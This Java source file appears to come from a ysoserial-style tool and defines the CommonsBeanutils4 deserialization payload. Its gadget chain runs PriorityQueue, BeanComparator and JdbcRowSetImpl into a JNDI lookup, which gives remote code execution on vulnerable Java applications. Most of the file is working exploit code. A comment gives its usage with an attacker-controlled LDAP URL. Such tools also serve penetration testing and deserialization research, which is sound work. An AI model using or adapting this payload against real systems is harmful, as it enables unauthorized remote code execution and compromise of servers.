package ysoserial.payloads;

import java.util.PriorityQueue;

import org.apache.commons.beanutils.BeanComparator;

import com.sun.rowset.JdbcRowSetImpl;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	CommonsBeanutils + JNDI sink — no TemplatesImpl needed.

	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				PriorityQueue.heapify()
					BeanComparator.compare()
						PropertyUtils.getProperty(obj, "databaseMetaData")
							JdbcRowSetImpl.getDatabaseMetaData()
								JdbcRowSetImpl.connect()
									InitialContext.lookup(dataSourceName)
										-> JNDI RCE

	Like CB1 but targets JdbcRowSetImpl instead of TemplatesImpl.
	No --add-opens for java.xml needed.

	Usage: payload arg is JNDI URL (ldap://attacker/Exploit)

	Requires:
		commons-beanutils 1.9.x
		commons-collections 3.x (BeanComparator dependency)
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
@Authors({ Authors.SU18 })
public class CommonsBeanutils4 extends PayloadRunner implements ObjectPayload<PriorityQueue> {

	public PriorityQueue getObject(final String jndiUrl) throws Exception {
		final JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
		jdbcRowSet.setDataSourceName(jndiUrl);
		Reflections.setFieldValue(jdbcRowSet, "iMatchColumns",
			new java.util.Vector<Integer>(java.util.Arrays.asList(-1,-1,-1,-1,-1,-1,-1,-1,-1,-1)));
		Reflections.setFieldValue(jdbcRowSet, "strMatchColumns",
			new java.util.Vector<String>(java.util.Arrays.asList("","","","","","","","","","")));

		final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
		queue.add("1");
		queue.add("1");

		Reflections.setFieldValue(comparator, "property", "databaseMetaData");

		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = jdbcRowSet;
		queueArray[1] = jdbcRowSet;

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutils4.class, args);
	}
}
